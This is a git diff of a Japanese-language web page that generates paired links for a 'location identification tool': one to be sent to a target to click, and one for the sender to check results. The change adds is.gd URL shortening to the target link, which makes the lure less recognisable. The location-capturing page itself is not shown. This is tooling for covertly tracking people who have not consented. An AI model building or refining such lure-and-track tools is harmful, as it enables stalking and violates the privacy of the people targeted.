@@ -3,12 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <meta property="og:title" content="位置情報特定ツール">
+
+  <meta property="og:title" content="位置情報特定ツール">
   <meta property="og:description" content="相手に踏ませる用、確認用URLを自動生成">
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://ginginman-infinity.github.io/Location-information2/generate.html">
   <meta name="twitter:card" content="summary">
+
   <title>URL生成ツール</title>
+
   <style>
     body {
       font-family: system-ui, sans-serif;
@@ -50,13 +53,13 @@
 </head>
 <body>
   <h1>リンク生成ツール</h1>
-  <p>ボタンを押すと、相手用と確認用URLが自動で作られます。</p>
+  <p>ボタンを押すと、相手用（短縮URL）と確認用URLが自動で作られます。</p>
 
   <button id="generateBtn">リンクを生成する</button>
 
   <div id="result" class="url-box" style="display:none;">
     <p>
-      <span class="label">相手用URL：</span><br>
+      <span class="label">相手用URL（短縮済み）：</span><br>
       <a id="targetLink" href="#" target="_blank"></a><br>
       <button class="copy-btn" id="copyTarget">📋 コピー</button>
     </p>
@@ -69,6 +72,18 @@
   </div>
 
   <script>
+    // URL短縮関数（is.gd）
+    async function shortenUrl(longUrl) {
+      try {
+        const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`);
+        const shortUrl = await response.text();
+        return shortUrl;
+      } catch (error) {
+        console.error("短縮に失敗しました:", error);
+        return longUrl; // 失敗したら元URLを返す
+      }
+    }
+
     function copyText(text, button) {
       navigator.clipboard.writeText(text).then(() => {
         button.textContent = "✅ コピー済み";
@@ -80,20 +95,24 @@
       });
     }
 
-    document.getElementById("generateBtn").addEventListener("click", () => {
+    document.getElementById("generateBtn").addEventListener("click", async () => {
       const id = Math.random().toString(36).substring(2, 9);
       const baseUrl = window.location.origin + window.location.pathname.replace("generate.html", "");
       const targetUrl = `${baseUrl}index.html?id=${id}`;
       const checkUrl = `${baseUrl}check.html?id=${id}`;
 
-      document.getElementById("targetLink").textContent = targetUrl;
-      document.getElementById("targetLink").href = targetUrl;
+      // 相手用URLを短縮
+      const shortTargetUrl = await shortenUrl(targetUrl);
+
+      // 表示
+      document.getElementById("targetLink").textContent = shortTargetUrl;
+      document.getElementById("targetLink").href = shortTargetUrl;
       document.getElementById("checkLink").textContent = checkUrl;
       document.getElementById("checkLink").href = checkUrl;
       document.getElementById("result").style.display = "block";
 
       // コピー機能
-      document.getElementById("copyTarget").onclick = () => copyText(targetUrl, document.getElementById("copyTarget"));
+      document.getElementById("copyTarget").onclick = () => copyText(shortTargetUrl, document.getElementById("copyTarget"));
       document.getElementById("copyCheck").onclick = () => copyText(checkUrl, document.getElementById("copyCheck"));
     });
   </script>
